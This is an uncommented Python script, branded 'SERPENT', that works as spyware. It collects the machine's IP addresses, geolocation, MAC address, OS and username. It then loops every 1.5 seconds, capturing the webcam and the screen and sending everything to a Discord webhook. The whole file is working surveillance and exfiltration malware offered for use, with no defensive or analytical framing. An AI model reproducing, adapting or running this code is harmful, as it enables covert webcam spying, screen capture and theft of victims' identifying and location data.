import socket
import platform
import psutil
import os
import cv2
import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed
from io import BytesIO
import requests
import time

WEBHOOK = "check"

host = socket.gethostname()
ip = socket.gethostbyname(host)

def api():
    try:
        data = requests.get("http://ipinfo.io/json").json()
        return tuple(data.get(k, 'N/A') for k in ['ip', 'country', 'region', 'city', 'org']) + tuple(data.get('loc', 'N/A,N/A').split(','))
    except requests.exceptions.RequestException:
        return ("N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")

public_ip, country, region, city, isp, latitude, longitude = api()

name = platform.system()
version = platform.version()

mac, gateway = "N/A", "N/A"
for interface, addrs in psutil.net_if_addrs().items():
    for addr in addrs:
        if addr.family == psutil.AF_LINK:
            mac = addr.address
        if addr.family == socket.AF_INET:
            gateway = addr.address
    if mac != "N/A" and gateway != "N/A":
        break

process = len(psutil.pids())
user = os.getlogin()

def webcam():
    ret, frame = cv2.VideoCapture(0).read()
    if ret:
        _, encoded = cv2.imencode(".jpg", frame)
        return encoded.tobytes()
    return None

def screenshot():
    byte = BytesIO()
    pyautogui.screenshot().convert('RGB').save(byte, format='JPEG')
    return byte.getvalue()

def webhook(webhook_url, webcam_image, screenshot_image, embed_sent):
    webhook = DiscordWebhook(url=webhook_url, username="SERPENT", avatar_url="https://media.assettype.com/freepressjournal/2023-07/679a673e-dd30-4dfe-a4e6-c5a63f9cc4de/WS____2023_07_15T115107_826.jpg")

    if not embed_sent:
        embed = DiscordEmbed(title="[SERPENT] INFORMATION", description="[SERPENT] DETAILS")
        embed.add_embed_field(name="Public IP Address", value=public_ip)
        embed.add_embed_field(name="Private IP Address", value=ip)
        embed.add_embed_field(name="Country", value=country)
        embed.add_embed_field(name="Region", value=region)
        embed.add_embed_field(name="City", value=city)
        embed.add_embed_field(name="ISP", value=isp)
        embed.add_embed_field(name="Organization", value="404")
        embed.add_embed_field(name="Latitude", value=latitude)
        embed.add_embed_field(name="Longitude", value=longitude)
        embed.add_embed_field(name="MAC Address", value=mac)
        embed.add_embed_field(name="Gateway IP", value=gateway)
        embed.add_embed_field(name="Hostname", value=host)
        embed.add_embed_field(name="OS", value=f"{name} {version}")
        embed.add_embed_field(name="User", value=user)
        embed.add_embed_field(name="Processes", value=str(process))
        webhook.add_embed(embed)

        embed_sent = True

    if webcam_image:
        webhook.add_file(file=webcam_image, filename="webcam.jpg")
    if screenshot_image:
        webhook.add_file(file=screenshot_image, filename="screenshot.jpg")

    webhook.execute()
    return embed_sent

embed_sent = False
while True:
    webcam_image = webcam()
    screenshot_image = screenshot()
    
    embed_sent = webhook(WEBHOOK, webcam_image, screenshot_image, embed_sent)
    
    time.sleep(1.5)
